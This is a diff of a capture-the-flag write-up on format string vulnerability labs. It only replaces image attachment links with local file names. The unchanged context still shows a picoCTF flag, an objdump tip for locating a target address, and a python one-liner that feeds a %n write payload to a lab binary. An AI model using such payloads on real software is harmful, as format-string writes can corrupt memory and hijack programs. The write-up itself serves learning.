@@ -112,7 +112,7 @@ objdump -t format1
 
 this lab is quite simple. You just choose the option that contain format string  
 
-![image.png](attachment:aece203a-ccde-4493-94d0-37e21cb2f207:image.png)
+![image.png](fs1.png)
 
 ```
 Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
@@ -141,7 +141,7 @@ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}
 
 # Format string 1
 
-![image.png](attachment:51396b11-3a6f-41fc-8dec-2a6464fa725f:image.png)
+![image.png](fs2.png)
 
 Alright let check this lab, i think i can do it after done first two format_string lab 
 
@@ -293,7 +293,7 @@ You need to `objdump -t`  to find the address of target :V
 (python -c 'print  "%19993d"+"aaaaa"+"\xf4\x96\x04\x08"+ "%1300777x "* 13 +"%n " '  )| ./format3
 ```
 
-![image.png](attachment:113a2f90-9073-4b9c-8ebd-6d673538f864:image.png)
+![image.png](fs3.png)
 
 well it print alot
 
@@ -424,7 +424,7 @@ AAAABBBBCCCC41414141 41414141 41414141 41414141 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
 ```
 
-![image.png](attachment:29a75753-84cb-4793-9cab-d6ea37b62acc:image.png)
+![image.png](fs4.png)
 
 this is a picture from [`LiveOverflow - YouTube`](https://www.youtube.com/@LiveOverflow)
 
